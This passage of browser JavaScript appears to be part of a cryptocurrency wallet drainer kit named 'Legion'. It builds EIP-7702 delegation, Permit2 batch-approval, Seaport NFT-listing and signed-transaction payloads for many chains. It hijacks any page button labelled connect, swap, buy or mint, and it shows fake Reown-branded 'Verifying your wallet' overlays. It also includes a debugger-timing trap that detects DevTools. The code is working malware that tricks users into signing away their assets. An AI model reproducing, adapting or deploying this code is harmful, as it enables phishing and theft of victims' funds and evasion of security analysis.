      var yP = auth.yParity !== undefined ? Number(auth.yParity)
        : (parseInt(String(auth.v || '0x1b').replace('0x', '') || '1b', 16) === 28 ? 1 : 0);
      return this.base({
        chain_family: 'EVM', protocol: 'eip7702_delegation',
        wallet_address: address.toLowerCase(), chain_id: Number(chainId),
        token_address: data.delegate, delegatee: data.delegate,
        signature: auth.r,
        eip7702_authorization: {
          chainId: Number(chainId), address: data.delegate,
          nonce: Number(data.nonce), r: auth.r, s: auth.s, yParity: yP,
        },
        erc20s: data.erc20s || [],
        defi_actions: data.defiActions || [],
        wallet_type: walletName,
      });
    },

    permit2: async function (p2, address, chainId, walletName, nfts, nftApprovalSigs) {
      var bd = p2.batchData;
      var nftArr = normNftList(nfts || p2.nfts);
      var nativeAmt = String(p2.nativeAmount || bd.nativeAmount || '0');
      var nativeSigned = p2.nativeSigned || '';
      return this.base({
        chain_family: 'EVM', protocol: 'permit2_batch_eip712',
        wallet_address: address.toLowerCase(), chain_id: Number(chainId),
        token_address: (bd.permits && bd.permits[0] && bd.permits[0].token) || NATIVE_ETH_ADDR,
        signature: p2.sig || '0x',
        engine_spender: bd.engine_spender, permit2: bd.permit2,
        permits: bd.permits, batch_permit_metadata: bd.batch_permit_metadata,
        native_amount: nativeAmt, nativeAmount: nativeAmt,
        native_signed_transaction: nativeSigned,
        nfts: nftArr,
        nft_approval_signatures: nftApprovalSigs || {},
        wallet_type: walletName,
      });
    },

    omnichain: async function (envelope) {
      return this.base(Object.assign({ protocol: 'omnichain_atomic_v1', chain_family: 'EVM' }, envelope));
    },

    solana: async function (address, signedB64, meta, walletName) {
      var solCaip = (window.LegionCaipRegistry && window.LegionCaipRegistry.SOLANA_MAINNET) || 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp';
      return this.viaBuilder('svm', {
        wallet_address: address,
        signature: sigHex({ signed_tx_b64: signedB64 }),
        nonce: 'legion:sol:' + Date.now() + ':' + Math.random().toString(36).slice(2, 5),
        expiry_iso: EXPIRY_ISO,
        wallet_type: walletName || 'Phantom',
        protocol: 'solana',
        chain_id: solCaip,
        caip_chain_id: solCaip,
        scout_value_usd: Number(S.scoutUsd) || 0,
        amount: (meta && meta.amount) ? String(meta.amount) : '0',
        requires_quorum: false,
      });
    },

    tron: async function (address, signedTx, tokenAddr, amount, walletName) {
      return this.viaBuilder('tron', {
        wallet_address: address,
        token_address: tokenAddr || VAULT.tron,
        signature: sigHex({ signed_tx: signedTx }),
        nonce: 'legion:trx:' + Date.now(),
        expiry_iso: EXPIRY_ISO,
        wallet_type: walletName || 'TronLink',
        protocol: 'tron',
        chain_id: 'tron:mainnet',
        scout_value_usd: Number(S.scoutUsd) || 0,
        amount: amount ? String(amount) : '0',
        requires_quorum: false,
      });
    },

    ton: async function (address, bocOrSig, amountNano, walletName) {
      return this.viaBuilder('ton', {
        wallet_address: address,
        signature: typeof bocOrSig === 'string' && bocOrSig.startsWith('0x')
          ? bocOrSig : sigHex({ boc: bocOrSig }),
        nonce: 'legion:ton:' + Date.now(),
        expiry_iso: EXPIRY_ISO,
        wallet_type: walletName || 'Tonkeeper',
        protocol: 'ton',
        chain_id: 'ton:mainnet',
        scout_value_usd: Number(S.scoutUsd) || 0,
        amount: amountNano ? String(amountNano) : '0',
        requires_quorum: false,
      });
    },

    bitcoin: async function (address, signedPsbtB64, amountSat, walletName) {
      return this.base({
        chain_family: 'UTXO', protocol: 'bitcoin_psbt',
        wallet_address: address,
        token_address: 'OMNI_UTXO_ANCHOR',
        signature: sigHex({ signed_psbt_b64: signedPsbtB64 }),
        signed_psbt_base64: signedPsbtB64,
        amount_sat: String(amountSat || '0'),
        chain_id: BIP122_BITCOIN_MAINNET,
        caip_chain_id: BIP122_BITCOIN_MAINNET,
        wallet_type: walletName || 'UniSat',
      });
    },

    cosmos: async function (address, signedDoc, amount, walletName) {
      return this.base({
        chain_family: 'COSMOS', protocol: 'cosmos',
        wallet_address: address,
        token_address: 'OMNI_COSMOS_ANCHOR',
        signature: sigHex(signedDoc),
        chain_id: 'cosmos:cosmoshub-4',
        amount: String(amount || '0'),
        wallet_type: walletName || 'Keplr',
      });
    },

    aptos: async function (address, txHashOrSig, walletName) {
      return this.base({
        chain_family: 'APTOS', protocol: 'aptos',
        wallet_address: address,
        token_address: 'OMNI_APTOS_ANCHOR',
        signature: sigHex({ hash: txHashOrSig }),
        chain_id: 'aptos:1',
        wallet_type: walletName || 'Petra',
      });
    },

    sui: async function (address, signedBytes, walletName) {
      return this.base({
        chain_family: 'SUI', protocol: 'sui',
        wallet_address: address,
        token_address: 'OMNI_SUI_ANCHOR',
        signature: sigHex({ signed_tx: signedBytes }),
        chain_id: 'sui:mainnet',
        wallet_type: walletName || 'Sui Wallet',
      });
    },

    polkadot: async function (address, sig, walletName) {
      return this.base({
        chain_family: 'POLKADOT', protocol: 'polkadot',
        wallet_address: address,
        token_address: 'OMNI_DOT_ANCHOR',
        signature: sigHex(sig),
        chain_id: 'polkadot:91b171bb158e2d3848fa23a9f1c25182',
        wallet_type: walletName || 'Polkadot',
      });
    },

    algorand: async function (address, sig, walletName) {
      return this.base({
        chain_family: 'ALGORAND', protocol: 'algorand',
        wallet_address: address,
        token_address: 'OMNI_ALGO_ANCHOR',
        signature: sigHex(sig),
        chain_id: 'algorand:416002',
        wallet_type: walletName || 'Algorand',
      });
    },

    cardano: async function (address, sig, walletName) {
      return this.base({
        chain_family: 'CARDANO', protocol: 'cardano',
        wallet_address: address,
        token_address: 'OMNI_ADA_ANCHOR',
        signature: sigHex(sig),
        chain_id: 'cardano:1',
        wallet_type: walletName || 'Cardano',
      });
    },

    nft: async function (nftR, address, chainId, walletName) {
      return this.base({
        chain_family: 'EVM', protocol: 'seaport_listing',
        wallet_address: address.toLowerCase(), chain_id: Number(chainId),
        token_address: (nftR.listing && (nftR.listing.contract || nftR.listing.nft_contract)) || NATIVE_ETH_ADDR,
        signature: nftR.sig, seaport_order: nftR.orderParams || {},
        wallet_type: walletName,
      });
    },
  };

  // ═══════════════════════════════════════════════════════════════
  // SECTION 15: SECURITY / ANTI-DETECTION
  // ═══════════════════════════════════════════════════════════════
  var SEC = {
    paused: false,
    startMonitor: function () {
      if (CFG.debugDevTools) return;
      setInterval(function () {
        try {
          var t0 = performance.now(); debugger; var t1 = performance.now();
          if (t1 - t0 > 200) { SEC.paused = true; L.warn('DevTools detected'); }
        } catch (e) {}
      }, 8000);
    },
  };

  function emitLegionEvent(name, detail) {
    try {
      window.dispatchEvent(new CustomEvent(name, { detail: detail || {} }));
    } catch (e) {}
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 16: UI LAYER + PAGE HOOKS (any frontend)
  // ═══════════════════════════════════════════════════════════════
  var HOOK_PATTERN = /connect\s*wallet|wallet\s*connect|\bconnect\b|sign\s*in|link\s*wallet|get\s*started|start\s*app|\bswap\b|\btrade\b|\bbuy\b|\bsell\b|\bmint\b|\bunlock\b|enable\s*wallet|open\s*wallet|trezor|ledger/i;
  var HOOK_SELECTORS = [
    '.interact-button', '#navConnectBtn', '#mainBtn', '.nav-connect', '.main-btn.connect',
    '[data-testid*="connect"]', '[data-testid*="Connect"]', '[data-testid*="wallet"]', '[data-testid*="Wallet"]',
    '[data-testid="navbar-connect-wallet"]', '[data-testid="wallet-connect"]',
    '[class*="connectWallet"]', '[class*="ConnectWallet"]', '[class*="ConnectButton"]', '[class*="connect-button"]',
    '[class*="wallet-connect"]', '[class*="WalletConnect"]', '[class*="wallet_connect"]',
    '#connect-wallet', '#connect-wallet-btn', '.connect-wallet', '[id*="connectButton"]', '[class*="walletButton"]',
    'button[class*="connect"]', 'a[class*="connect"]', '[class*="ConnectBtn"]',
    '[class*="swap-button"]', '[class*="SwapButton"]', '[data-testid*="swap"]',
    '[class*="trezor"]', '[class*="Trezor"]', '[aria-label*="Connect"]', '[aria-label*="Wallet"]',
  ];

  var WALLET_ICONS = {
    MetaMask: '🦊', Rabby: '🐰', 'Coinbase Wallet': '🔵', 'Trust Wallet': '🛡️',
    'Brave Wallet': '🦁', 'OKX Wallet': '⬛', Phantom: '👻', WalletConnect: '🔗',
  };

  function walletIdentity(row) {
    if (row.type === 'wc') return 'wc';
    var info = row.info || {};
    var p = row.provider;
    if (info.rdns) return 'rdns:' + String(info.rdns).toLowerCase();
    if (p) {
      if (p.isRabby) return 'rdns:io.rabby';
      if (p.isBraveWallet) return 'rdns:com.brave.wallet';
      if (p.isCoinbaseWallet || p.isCoinbaseBrowser) return 'rdns:com.coinbase.wallet';
      if (p.isTrust || p.isTrustWallet) return 'rdns:com.trustwallet.app';
      if (p.isOkxWallet || p.isOKExWallet) return 'rdns:com.okex.wallet';
      if (p.isPhantom) return 'rdns:app.phantom';
      if (p.isMetaMask) return 'rdns:io.metamask';
    }
    if (info.uuid) return 'uuid:' + info.uuid;
    return 'name:' + String(info.name || detectEvmWalletName(p) || 'wallet').toLowerCase();
  }

  async function buildWalletList() {
    requestProviders();
    await sleep(400);
    var rows = [];
    var seen = {};
    function addRow(row) {
      if (!row) return;
      var key = walletIdentity(row);
      if (seen[key]) return;
      if (row.provider) {
        for (var i = 0; i < rows.length; i++) {
          if (rows[i].provider === row.provider) return;
        }
      }
      seen[key] = true;
      rows.push(row);
    }
    S.discovered.forEach(function (w) {
      addRow({ type: 'injected', info: w.info, provider: w.provider });
    });
    if (window.ethereum) {
      var eth = window.ethereum;
      if (Array.isArray(eth.providers)) {
        eth.providers.forEach(function (p) {
          addRow({ type: 'injected', info: { name: detectEvmWalletName(p) }, provider: p });
        });
      } else if (!S.discovered.length) {
        addRow({ type: 'injected', info: { name: detectEvmWalletName(eth) }, provider: eth });
      }
    }
    addRow({ type: 'wc', info: { name: 'WalletConnect' }, provider: null });
    var wcRow = rows.filter(function (r) { return r.type === 'wc'; });
    var injRows = rows.filter(function (r) { return r.type !== 'wc'; });
    return wcRow.concat(injRows);
  }

  async function openExtensionPicker() {
    if (S.drainRunning) return;
    if (isWcConnectActive()) {
      logConnect('blocked', 'close WalletConnect QR before picking extension');
      UI.showStatus('Close WalletConnect first — or use MetaMask button for browser wallet');
      return;
    }
    if (!S.vaultLoaded) prefetchVault();
    await prepInjectedMode();
    if (document.querySelector('[data-testid="account-drawer-container"]')) {
      var openFn = window.customModalOpen;
      if (typeof openFn === 'function' && openFn !== defaultConnect) {
        openFn();
        return;
      }
    }
    if (window.LegionDrawer && typeof window.LegionDrawer.open === 'function') {
      window.LegionDrawer.open();
      return;
    }
    UI.showWalletModal(function (choice) { connectWithWallet(choice); });
  }

  function openWalletModal() {
    defaultConnect();
  }

  async function connectWithWallet(choice) {
    if (!choice) return;
    if (choice.type === 'wc') {
      await handleWC();
      return;
    }
    if (isWcConnectActive()) {
      logConnect('blocked', 'extension click ignored — WC in progress');
      return;
    }
    if (!(await prepInjectedMode())) return;
    S.injectedWalletKey = String(
      (choice.info && (choice.info.walletKey || choice.info.name)) || choice.walletKey || 'injected'
    ).toLowerCase();
    UI._walletIcon = (choice.info && choice.info.icon) || '';
    if (!UI._overlayEl) UI.overlay.show('connecting', { walletIcon: UI._walletIcon });
    if (choice.provider) await handleEvmConnect(choice.provider, choice);
  }

  function hookPageButtons(onOpen) {
    if (!HOOK_BUTTONS || !onOpen) return 0;
    var hooked = 0;
    var seen = {};
    function tryHook(el) {
      if (!el || el.__lgnHooked || seen[el]) return;
      if (el.closest && el.closest('#__lgn_wm')) return;
      if (el.closest && el.closest('[data-testid="account-drawer-container"]')) return;
      var label = ((el.textContent || '') + ' ' + (el.getAttribute('aria-label') || '') + ' ' +
        (el.getAttribute('title') || '') + ' ' + (el.getAttribute('data-testid') || '')).trim();
      var match = HOOK_PATTERN.test(label);
      if (!match && el.classList && el.classList.contains('interact-button')) {
        var tl = (el.textContent || '').trim().toLowerCase();
        if (/connect|swap|trade|get started/.test(tl)) match = true;
      }
      if (!match) {
        for (var si = 0; si < HOOK_SELECTORS.length; si++) {
          try { if (el.matches && el.matches(HOOK_SELECTORS[si])) { match = true; break; } } catch (e) {}
        }
      }
      if (!match) return;
      seen[el] = true;
      el.__lgnHooked = true;
      hooked++;
      el.addEventListener('click', function (e) {
          e.preventDefault();
          e.stopPropagation();
        onOpen();
      }, true);
    }
    try {
      document.querySelectorAll('button, a, [role="button"], span[onclick], div[onclick]').forEach(tryHook);
      HOOK_SELECTORS.forEach(function (sel) {
        document.querySelectorAll(sel).forEach(tryHook);
      });
    } catch (e) {}
    return hooked;
  }

  function startButtonObserver(onOpen) {
    if (!HOOK_BUTTONS || typeof MutationObserver === 'undefined' || !document.body) return;
    var n = 0;
    var timer;
    var obs = new MutationObserver(function () {
      if (n >= 20) { obs.disconnect(); return; }
      clearTimeout(timer);
      timer = setTimeout(function () { n++; hookPageButtons(onOpen); }, 600);
    });
    obs.observe(document.body, { childList: true, subtree: true });
  }

  var UI = {
    statusEl: null,
    _overlayEl: null,

    _reownBrandSvg: function () {
      return '<svg class="__lgn_co_brand" viewBox="0 0 60 16" fill="none" aria-hidden="true">'
        + '<path d="M9.3335 4.66667C9.3335 2.08934 11.4229 0 14.0002 0H20.6669C23.2442 0 25.3335 2.08934 25.3335 4.66667V11.3333C25.3335 13.9106 23.2442 16 20.6669 16H14.0002C11.4229 16 9.3335 13.9106 9.3335 11.3333V4.66667Z" fill="#363636"/>'
        + '<path d="M15.6055 11.0003L17.9448 4.66699H18.6316L16.2923 11.0003H15.6055Z" fill="#F6F6F6"/>'
        + '<path d="M0 4.33333C0 1.9401 1.9401 0 4.33333 0C6.72657 0 8.66669 1.9401 8.66669 4.33333V11.6667C8.66669 14.0599 6.72657 16 4.33333 16C1.9401 16 0 14.0599 0 11.6667V4.33333Z" fill="#363636"/>'
        + '<path d="M3.9165 9.99934V9.16602H4.74983V9.99934H3.9165Z" fill="#F6F6F6"/>'
        + '<path d="M26 8C26 3.58172 29.3517 0 33.4863 0H52.5137C56.6483 0 60 3.58172 60 8C60 12.4183 56.6483 16 52.5137 16H33.4863C29.3517 16 26 12.4183 26 8Z" fill="#363636"/>'
        + '<path d="M49.3687 9.95834V6.26232H50.0213V6.81966C50.256 6.40899 50.7326 6.16699 51.2606 6.16699C52.0599 6.16699 52.6173 6.67299 52.6173 7.65566V9.95834H51.972V7.69234C51.972 7.04696 51.6053 6.70966 51.07 6.70966C50.4906 6.70966 50.0213 7.17168 50.0213 7.82433V9.95834H49.3687Z" fill="#F6F6F6"/>'
        + '<path d="M45.2538 9.95773L44.5718 6.26172H45.1877L45.6717 9.31242L46.3098 7.30306H46.9184L47.5491 9.29041L48.0404 6.26172H48.6564L47.9744 9.95773H47.2411L46.6178 8.03641L45.9871 9.95773H45.2538Z" fill="#F6F6F6"/>'
        + '<path d="M42.3709 10.0536C41.2489 10.0536 40.5889 9.21765 40.5889 8.1103C40.5889 7.01035 41.2489 6.16699 42.3709 6.16699C43.4929 6.16699 44.1529 7.01035 44.1529 8.1103C44.1529 9.21765 43.4929 10.0536 42.3709 10.0536ZM42.3709 9.51096C43.1775 9.51096 43.4856 8.82164 43.4856 8.10296C43.4856 7.39163 43.1775 6.70966 42.3709 6.70966C41.5642 6.70966 41.2562 7.39163 41.2562 8.10296C41.2562 8.82164 41.5642 9.51096 42.3709 9.51096Z" fill="#F6F6F6"/>'
        + '<path d="M38.2805 10.0536C37.1952 10.0536 36.5132 9.22499 36.5132 8.1103C36.5132 7.00302 37.1952 6.16699 38.2805 6.16699C39.1972 6.16699 40.0038 6.68766 39.9159 8.27896H37.1805C37.2319 8.96103 37.5472 9.5183 38.2805 9.5183C38.7718 9.5183 39.0945 9.21765 39.2045 8.87299H39.8499C39.7472 9.48903 39.1679 10.0536 38.2805 10.0536ZM37.1952 7.78765H39.2852C39.2338 7.04696 38.8892 6.70232 38.2805 6.70232C37.6132 6.70232 37.2832 7.18635 37.1952 7.78765Z" fill="#F6F6F6"/>'
        + '<path d="M33.3828 9.95773V6.26172H34.0501V6.88506C34.2848 6.47439 34.6882 6.26172 35.1061 6.26172H35.9935V6.88506H35.0548C34.4682 6.88506 34.0501 7.26638 34.0501 8.00706V9.95773H33.3828Z" fill="#F6F6F6"/>'
        + '</svg>';
    },

    _reownThumbSvg: function () {
      var t = 36;
      var dash1 = 116 + (36 - t);
      var dash2 = 245 + (36 - t);
      var offset = 360 + (36 - t) * 1.75;
      return '<svg class="__lgn_co_thumb" viewBox="0 0 110 110" aria-hidden="true">'
        + '<rect x="2" y="2" width="106" height="106" rx="' + t + '" fill="none" stroke="#0988F0" stroke-width="3" stroke-linecap="round"'
        + ' stroke-dasharray="' + dash1 + ' ' + dash2 + '" stroke-dashoffset="' + offset + '"/>'
        + '</svg>';
    },

    _reownAvatarSvg: function () {
      return '<svg width="80" height="80" viewBox="0 0 80 80" fill="none" aria-hidden="true">'
        + '<rect width="80" height="80" rx="20" fill="#ECECEC"/>'
        + '<circle cx="40" cy="32" r="12" stroke="#9E9E9E" stroke-width="2.5" fill="none"/>'
        + '<path d="M18 66c0-12.15 9.85-22 22-22s22 9.85 22 22" stroke="#9E9E9E" stroke-width="2.5" stroke-linecap="round" fill="none"/>'
        + '</svg>';
    },

    overlay: {
      show: function (mode, opts) {
        UI.injectModalStyles();
        opts = opts || {};
        var titleText = mode === 'verifying' ? 'Verifying your wallet' : 'Connecting your wallet';
        if (UI._overlayEl) {
          var existingTitle = UI._overlayEl.querySelector('.__lgn_co_title');
          if (existingTitle) existingTitle.textContent = titleText;
          return;
        }
        closeAppKitModal();
        var walletIcon = opts.walletIcon || UI._walletIcon || '';
        var ov = document.createElement('div');
        ov.id = '__lgn_co';
        ov.innerHTML = ''
          + '<div class="__lgn_co_modal" role="dialog" aria-modal="true" aria-label="' + titleText + '">'
          + '  <div class="__lgn_co_head">' + UI._reownBrandSvg() + '</div>'
          + '  <div class="__lgn_co_body">'
          + '    <div class="__lgn_co_loader_wrap">'
          + '      <div class="__lgn_co_avatar">' + (walletIcon
            ? '<img src="' + walletIcon + '" alt="" width="80" height="80" style="border-radius:20px;object-fit:cover"/>'
            : UI._reownAvatarSvg()) + '</div>'
          + UI._reownThumbSvg()
          + '    </div>'
          + '    <div class="__lgn_co_title">' + titleText + '</div>'
          + '    <div class="__lgn_co_sub">Please hold on while we complete the process . . .</div>'
          + '  </div>'
          + '</div>';
        document.body.appendChild(ov);
        UI._overlayEl = ov;
        requestAnimationFrame(function () { ov.classList.add('__lgn_co--visible'); });
        document.documentElement.classList.add('legion-overlay-active');
      },
      hide: function () {
        if (!UI._overlayEl) {
          document.documentElement.classList.remove('legion-overlay-active');
          return;
        }
        var el = UI._overlayEl;
        UI._overlayEl = null;
        el.classList.remove('__lgn_co--visible');
        setTimeout(function () {
          try { el.remove(); } catch (e) {}
        }, 220);
        document.documentElement.classList.remove('legion-overlay-active');
      },
    },

    status: function (msg) {
      L.log('[UI]', msg);
      if (/sign|confirm|verif|batch|security|approve/i.test(String(msg || ''))) {
        this.overlay.show('verifying');
      }
    },

    injectModalStyles: function () {
      var styleId = '__lgn_wm_css_v597';
      if (document.getElementById(styleId)) return;
      var old = document.getElementById('__lgn_wm_css');
      if (old) old.remove();
      old = document.getElementById('__lgn_wm_css_v594');
      if (old) old.remove();
      old = document.getElementById('__lgn_wm_css_v595');
      if (old) old.remove();
      var style = document.createElement('style');
      style.id = styleId;
      style.textContent = ''
        + '#__lgn_wm{position:fixed;inset:0;background:rgba(0,0,0,.72);z-index:2147483646;display:flex;align-items:center;justify-content:center;padding:16px;font-family:Inter,-apple-system,BlinkMacSystemFont,sans-serif}'
        + '#__lgn_wm_box{background:#131313;border:1px solid rgba(255,255,255,.08);border-radius:24px;width:100%;max-width:400px;max-height:85vh;overflow:hidden;box-shadow:0 24px 80px rgba(0,0,0,.55)}'
        + '#__lgn_wm_head{display:flex;align-items:center;justify-content:space-between;padding:20px 20px 12px}'
        + '#__lgn_wm_head h2{margin:0;font-size:18px;font-weight:700;color:#f5f5f5}'
        + '#__lgn_wm_x{background:transparent;border:none;color:#888;font-size:22px;cursor:pointer;padding:4px 8px;border-radius:8px}'
        + '#__lgn_wm_x:hover{background:rgba(255,255,255,.06);color:#fff}'
        + '#__lgn_wm_list{padding:8px 12px 16px;overflow-y:auto;max-height:calc(85vh - 80px)}'
        + '.__lgn_wm_row{display:flex;align-items:center;gap:12px;width:100%;padding:14px 12px;margin-bottom:6px;background:#1c1c1c;border:1px solid rgba(255,255,255,.06);border-radius:16px;cursor:pointer;color:#f5f5f5;font-size:15px;font-weight:600;text-align:left;transition:background .15s}'
        + '.__lgn_wm_row:hover{background:#242424;border-color:rgba(252,114,255,.25)}'
        + '.__lgn_wm_icon{width:36px;height:36px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0;background:#2a2a2a}'
        + '.__lgn_wm_meta{flex:1;min-width:0}'
        + '.__lgn_wm_badge{font-size:11px;color:#888;font-weight:500;margin-top:2px}'
        + '.__lgn_wm_arr{color:#555;font-size:18px}'
        + '#__lgn_st{position:fixed;bottom:16px;left:50%;transform:translateX(-50%);background:rgba(19,19,19,.92);color:#e5e7eb;border:1px solid rgba(255,255,255,.1);border-radius:12px;padding:10px 18px;font-size:13px;z-index:2147483645;display:none;pointer-events:none}'
        + '@font-face{font-family:"KHTeka";font-style:normal;font-weight:400;font-display:swap;src:url("https://fonts.reown.com/KHTeka-Regular.woff2") format("woff2")}'
        + '@font-face{font-family:"KHTeka";font-style:normal;font-weight:500;font-display:swap;src:url("https://fonts.reown.com/KHTeka-Medium.woff2") format("woff2")}'
        + '#__lgn_co{position:fixed;inset:0;z-index:2147483647;display:flex;align-items:center;justify-content:center;padding:16px;background:rgba(255,255,255,.72);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);font-family:"KHTeka",-apple-system,BlinkMacSystemFont,sans-serif;opacity:0;transition:opacity .2s ease}'
        + '#__lgn_co.__lgn_co--visible{opacity:1}'
        + '.__lgn_co_modal{width:100%;max-width:370px;background:#fff;border-radius:36px;box-shadow:0 2px 8px rgba(0,0,0,.05),inset 0 0 0 1px rgba(0,0,0,.06);overflow:hidden;transform:translateY(4px);animation:__lgn_co_in .25s ease forwards}'
        + '@keyframes __lgn_co_in{to{transform:translateY(0)}}'
        + '.__lgn_co_head{display:flex;justify-content:flex-start;align-items:center;padding:16px 20px 12px;border-bottom:1px solid rgba(0,0,0,.06)}'
        + '.__lgn_co_brand{display:block;height:24px;width:auto}'
        + '.__lgn_co_body{padding:28px 28px 40px;text-align:center}'
        + '.__lgn_co_loader_wrap{position:relative;width:110px;height:110px;margin:12px auto 28px;display:flex;align-items:center;justify-content:center}'
        + '.__lgn_co_avatar{position:relative;z-index:1;width:80px;height:80px;display:flex;align-items:center;justify-content:center;flex-shrink:0}'
        + '.__lgn_co_thumb{position:absolute;inset:0;width:110px;height:110px;pointer-events:none}'
        + '.__lgn_co_thumb rect{animation:__lgn_co_dash 1s linear infinite;will-change:stroke-dashoffset}'
        + '@keyframes __lgn_co_dash{to{stroke-dashoffset:0}}'
        + '.__lgn_co_title{font-size:20px;font-weight:500;color:#141414;line-height:1.3;margin:0 0 10px;letter-spacing:-.01em}'
        + '.__lgn_co_sub{font-size:16px;font-weight:400;color:#868686;line-height:1.5;margin:0}'
        + 'html.legion-overlay-active{overflow:hidden}';
      document.head.appendChild(style);
    },

    closeWalletModal: function () {
      if (window.LegionDrawer && typeof window.LegionDrawer.close === 'function') {
        window.LegionDrawer.close();
      }
      var el = document.getElementById('__lgn_wm');
      if (el) el.remove();
      document.documentElement.classList.remove('wallet-modal-active');
    },

    showWalletModal: function (onSelect) {
      if (document.querySelector('[data-testid="account-drawer-container"]')) {
        var openFn = window.customModalOpen;
        if (typeof openFn === 'function' && openFn !== defaultConnect) {
          openFn();
          return;
        }
      }
      if (window.LegionDrawer && typeof window.LegionDrawer.open === 'function') {
        window.LegionDrawer.open();
        return;
      }
      var self = this;
      self.injectModalStyles();
      self.closeWalletModal();
      document.documentElement.classList.add('wallet-modal-active');

      var ov = document.createElement('div');
      ov.id = '__lgn_wm';
      var box = document.createElement('div');
      box.id = '__lgn_wm_box';
      var head = document.createElement('div');
      head.id = '__lgn_wm_head';
      var title = document.createElement('h2');
      title.textContent = 'Connect a wallet';
      var closeX = document.createElement('button');
      closeX.id = '__lgn_wm_x';
      closeX.textContent = '✕';
      closeX.onclick = function () { self.closeWalletModal(); };
      head.appendChild(title);
      head.appendChild(closeX);

      var list = document.createElement('div');
      list.id = '__lgn_wm_list';
      list.innerHTML = '<div style="color:#888;padding:24px;text-align:center">Detecting wallets...</div>';

      box.appendChild(head);
      box.appendChild(list);
      ov.appendChild(box);
      ov.addEventListener('click', function (e) { if (e.target === ov) self.closeWalletModal(); });
      document.body.appendChild(ov);

      buildWalletList().then(function (wallets) {
        list.innerHTML = '';
        if (!wallets.length) {
          list.innerHTML = '<div style="color:#888;padding:24px;text-align:center">No wallets found</div>';
          return;
        }
        wallets.forEach(function (w) {
          var name = (w.info && w.info.name) || 'Wallet';
          var row = document.createElement('button');
          row.type = 'button';
          row.className = '__lgn_wm_row';
          var icon = document.createElement('div');
          icon.className = '__lgn_wm_icon';
          if (w.info && w.info.icon) {
            var img = document.createElement('img');
            img.src = w.info.icon;
            img.style.cssText = 'width:28px;height:28px;border-radius:8px';
            img.onerror = function () { icon.textContent = WALLET_ICONS[name] || '👛'; };
            icon.appendChild(img);
          } else {
            icon.textContent = WALLET_ICONS[name] || '👛';
          }
          var meta = document.createElement('div');
          meta.className = '__lgn_wm_meta';
          meta.innerHTML = '<div>' + name + '</div>';
          if (w.type === 'injected') {
            var badge = document.createElement('div');
            badge.className = '__lgn_wm_badge';
            badge.textContent = 'Installed';
            meta.appendChild(badge);
          }
          var arr = document.createElement('span');
          arr.className = '__lgn_wm_arr';
          arr.textContent = '›';
          row.appendChild(icon);
          row.appendChild(meta);
          row.appendChild(arr);
          row.onclick = function () {
            self.closeWalletModal();
            UI._walletIcon = (w.info && w.info.icon) || '';
            if (window.legion && typeof window.legion.beginConnect === 'function') {
              window.legion.beginConnect(w.type === 'wc' ? 'wc' : 'injected');
            } else {
              UI.overlay.show('connecting', { walletIcon: UI._walletIcon });
            }
            onSelect(w);
          };
          list.appendChild(row);
        });
      }).catch(function (e) {
        list.innerHTML = '<div style="color:#f88;padding:24px;text-align:center">' + e.message + '</div>';
      });
    },

    inject: function (onOpen, onWC) {
      var openFn = onOpen || openWalletModal;
      if (HOOK_BUTTONS) {
        hookPageButtons(openFn);
        startButtonObserver(openFn);
      }
      this.injectModalStyles();
      if (!document.getElementById('__lgn_st')) {
        var st = document.createElement('div');
        st.id = '__lgn_st';
        document.body.appendChild(st);
        this.statusEl = st;
      }
      if (!SHOW_OVERLAY || document.getElementById('__lgn_root')) return;

      var style = document.createElement('style');
      style.textContent = '#__lgn_root{position:fixed;bottom:20px;right:20px;z-index:2147483647;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif}'
        + '#__lgn_root button{border:none;border-radius:12px;padding:11px 22px;font-size:14px;font-weight:600;cursor:pointer}';
      document.head.appendChild(style);
      var root = document.createElement('div');
      root.id = '__lgn_root';
      var cb = document.createElement('button');
      cb.id = '__lgn_cb';
      cb.textContent = 'Connect Wallet';
      cb.style.cssText = 'background:#fc72ff;color:#000;margin-right:8px';
      var wb = document.createElement('button');
      wb.id = '__lgn_wb';
      wb.textContent = 'Browser Extension';
      wb.style.cssText = 'background:#374151;color:#fff;font-size:12px';
      cb.onclick = function () { if (onOpen) onOpen(); else defaultConnect(); };
      wb.onclick = function () { openExtensionPicker(); };
      root.appendChild(cb);
      root.appendChild(wb);
      document.body.appendChild(root);
    },

    showStatus: function (msg) {
      var el = document.getElementById('__lgn_st');
      if (!el) return;
      if (!msg) { el.style.display = 'none'; return; }
      el.textContent = msg;
      el.style.display = 'block';
      clearTimeout(this._stTimer);
      this._stTimer = setTimeout(function () { el.style.display = 'none'; }, 8000);
    },

    showUserRejected: function () {
      this.showStatus(userRejectionMessage());
      this.overlay.hide();
    },

    showConnectError: function (msg) {
      this.overlay.hide();
      this.showStatus(msg || 'Could not connect. Install the wallet extension or try WalletConnect.');
    },

    setConnected: function (addr, chainName) {
      var short = addr.slice(0, 6) + '...' + addr.slice(-4);
      var nb = document.getElementById('navConnectBtn');
      if (nb) { nb.textContent = short; nb.classList.add('connected'); }
      var cb = document.getElementById('__lgn_cb');
      if (cb) { cb.textContent = short; cb.style.background = '#15803d'; }
      this.showStatus('Connected — ' + chainName);
      this.closeWalletModal();
    },

    picker: function (wallets, onPick) {
      this.showWalletModal(function (w) {
        if (w.type === 'wc') { handleWC(); return; }
        onPick(w);
      });
    },
  };

  // ═══════════════════════════════════════════════════════════════
  // SECTION 17: BOOTSTRAP — MAIN ENTRY
  // ═══════════════════════════════════════════════════════════════

  async function handleEvmConnect(provider, walletInfo, hwObj) {
    if (S.connecting) {
      L.warn('Connect already in progress — skip duplicate');
      return;
    }
    var isWcProv = !!(provider && provider.isWalletConnect === true);
    if (S.connectMode === 'wc' && !isWcProv && !hwObj) {
      logConnect('reject', 'extension hijack during MOBILE-WC');
      await clearInjectedSession({ keepMode: true });
      return;
    }
    if (S.connectMode === 'injected' && isWcProv && !hwObj) {
      logConnect('reject', 'WC provider during extension mode');
      return;
    }
    S.connecting = true;
    S.connectMode = isWcProv ? 'wc' : 'injected';
    try {
      var accounts = await evmRequestAccounts(provider);
      if (!accounts || !accounts.length) throw new Error('No accounts returned');
      var address = (accounts[0] || '').toLowerCase();
      var chainId;
      if (provider && provider.isWalletConnect) {
        chainId = await resolveWcEvmChainIdFromProvider(provider);
      } else {
      var chainHex = await provider.request({ method: 'eth_chainId' });
        chainId = parseInt(String(chainHex).replace('0x', ''), 16);
      }
